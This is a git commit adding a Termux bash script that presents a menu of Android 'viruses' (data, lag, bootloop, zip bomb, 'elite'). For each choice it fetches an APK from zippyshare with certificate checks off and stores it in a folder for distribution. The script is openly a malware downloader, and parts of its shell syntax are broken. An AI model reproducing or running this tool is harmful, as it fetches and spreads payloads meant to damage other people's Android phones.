0f3c294ac7d68d65d33e93560a9791d792134cd3
FajarFirdaus732 <35714197+FajarTheGGman@users.noreply.github.com>
2018-12-02 10:56:22 +0700

    Add files via upload

---
+++ Bacod/virus_android.sh
@@ -0,0 +1,85 @@
+#!/usr/bin/bash
+#import sys os
+apt update&&apt upgrade -y
+pkg install wget -y
+pkg install toilet -y
+pkg install figlet -y
+pkg install neofetch -y
+blue='\033[34;1m'
+green='\033[32;1m'
+purple='\033[35;1m'
+cyan='\033[36;1m'
+red='\033[31;1m'
+white='\033[37;1m'
+yellow='\033[33;1m'
+echo "<======================================>"
+neofetch
+echo "<======================================>"
+sleep 2
+echo "<======================================>"
+echo "Fb : https://www.facebook.com/Ace.of.spades729"
+echo "Ig : fajar_firdaus_7"
+echo "YT : iTech7732"
+echo "<======================================>"
+echo ""
+echo "1.> Virus Data"
+echo "2.> Virus Lag"
+echo "3.> Virus Bootloop"
+echo "4.> Virus Bom Zip"
+echo "5.> Virus Elite"
+echo "0.>exit"
+echo ""
+echo "<======================================>"
+read -p "root@V-Glitch-#" $asw
+
+if [ $asw = 1 ] || [ $asw = 1 ]
+then
+clear
+figlet Downloading Virus
+wget --no-check-ceritificate https://www116.zippyshare.com/d/aoUSOhTE/606/virus_data.apk
+mv virus_data.apk virus_android
+echo "Done tinggal liat virus di folder virus_android"
+fi
+
+if [ $asw = 2 ] || [ $asw = 2 ]
+then
+clear
+figlet Downloading Virus
+wget --no-check-ceritificate https://www113.zippyshare.com/d/2uPO3uvo/135/virus_lag.apk
+mv virus_lag.apk virus_android
+echo "Done tinggal liat virus di folder virus_android"
+fi
+
+if [ $asw = 3 ] || [ $asw = 3 ]
+then
+clear
+figlet Downloading Virus
+wget --no-check-ceritificate https://www116.zippyshare.com/d/tfW7M2xt/937/virus_bootloop.apk
+mv virus_bootloop.apk virus_android
+echo "Done tinggal liat virus di folder virus_android"
+fi
+
+if [ $asw = 4 ] || [ $asw = 4 ]
+then
+clear
+figlet Downloading Virus
+wget --no-check-certificate https://www116.zippyshare.com/d/OTAlt6kK/495/bom_zip.apk
+mv bom_zip.apk virus_android
+echo "Done tinggal liat virus di folder virus_android"
+fi
+
+if [ $asw = 5 ] || [ $asw = 5 ]
+then
+clear
+figlet Downloading Virus
+wget --no-check-certificate https://www24.zippyshare.com/d/yc2Nat3W/32/virus_elite.apk
+mv virus_elite.apk virus_android
+fi
+
+if [ $asw = 0 ] || [ $asw = 0]
+clear
+echo "Terimakasih Telah Menggunakan Tools ini :)"
+sleep 2
+echo "Recode gw bacok !!!!!!!!!"
+exit
+fi
